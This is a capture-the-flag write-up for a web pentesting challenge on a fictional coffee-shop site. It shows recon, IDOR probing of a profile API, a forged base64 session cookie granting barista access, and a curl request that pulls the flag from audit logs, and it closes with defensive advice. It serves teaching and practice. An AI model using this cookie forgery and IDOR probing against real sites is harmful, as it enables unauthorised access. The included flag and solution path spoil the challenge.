@@ -1,0 +1,97 @@
+---
+title: "El Café Clandestino ☕"
+description: "A fictional coffee shop website at https://esquina.byronlabs.io/. Find the flag hidden somewhere behind the scenes."
+date: 2026-02-13T12:21:00.000Z
+tags: ["ctf", "pentesting-web", "adabyron"]
+ctf: "Cátedra Ada Byron UAH (INCIBE)"
+category: "Pentesting Web"
+---
+
+**CTF:** Cátedra Ada Byron UAH (INCIBE)  
+**Category:** Pentesting Web  
+**Difficulty:** 150
+
+## Challenge
+
+A fictional coffee shop website at `https://esquina.byronlabs.io/`. Find the flag hidden somewhere behind the scenes.
+
+## Solution
+
+### Recon
+
+The source code of the main page had two immediate clues. An HTML comment:
+
+```html
+<!-- TODO: implementar sistema de puntos VIP cuando usuario_id >= 200 -->
+```
+
+And in the footer:
+
+```
+Sesión: cliente_regular (ID: 105)
+```
+
+So there's a user ID system, and IDs 200+ unlock VIP features. Checking the cookies revealed a `sesion_cafe` cookie that was just plain base64:
+
+```json
+{"usuario_id": 105, "nivel_acceso": "cliente_regular"}
+```
+
+No signature, no HMAC, no JWT — completely manipulable.
+
+### IDOR on the API
+
+The client panel at `/panel` exposed an API endpoint: `/api/v1/perfil_cliente/105`. Tried other IDs:
+
+- `/api/v1/perfil_cliente/200` — returned a normal user profile
+- `/api/v1/perfil_cliente/1` — "Acceso denegado: Este perfil pertenece a la administración del establecimiento"
+
+So ID 1 is the admin.
+
+### Hidden endpoint in app.js
+
+Looking through `/static/js/app.js` revealed an undocumented endpoint:
+
+```javascript
+const response = await fetch('/barista/configuracion', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `pin=${pin}`
+});
+```
+
+A barista panel protected by a 4-digit PIN. But we don't need the PIN if we can just forge the cookie.
+
+### Cookie tampering
+
+Crafted a new cookie with barista access and user ID 1:
+
+```json
+{"usuario_id": 1, "nivel_acceso": "barista"}
+```
+
+Base64 encoded: `eyJ1c3VhcmlvX2lkIjogMSwgIm5pdmVsX2FjY2VzbyI6ICJiYXJpc3RhIn0=`
+
+Replaced the `sesion_cafe` cookie and accessed `/barista/`. The page now showed a new link: `[ Panel Empleados ]` pointing to `/barista/panel`.
+
+### Extracting the flag
+
+The employee panel had mostly disabled sections, but two active links: `/barista/exportar_registros` and `/empleados.txt`. Hitting the audit logs endpoint:
+
+```bash
+curl -b "sesion_cafe=eyJ1c3VhcmlvX2lkIjogMSwgIm5pdmVsX2FjY2VzbyI6ICJiYXJpc3RhIn0=" \
+  https://esquina.byronlabs.io/barista/exportar_registros
+```
+
+Buried in the logs:
+
+```
+[2025-01-15 15:12:09] NOTA_SISTEMA: Flag de verificación guardada
+[2025-01-15 15:12:10] BACKUP_ENTRY: CTF{3l_c4f3_nun<4_fu3_un_c4f3_n0rm4l}
+```
+
+Flag: `CTF{3l_c4f3_nun<4_fu3_un_c4f3_n0rm4l}`
+
+## Takeaway
+
+A full chain of four vulnerabilities: unsigned cookies allow session forgery, IDOR on the API confirms the admin user ID, source code analysis reveals hidden endpoints, and broken access control lets a forged barista cookie bypass the PIN entirely. The biggest issue is the cookie — base64 without any cryptographic signing means the client controls their own privilege level. A properly signed JWT or server-side session would have stopped this chain at step one.
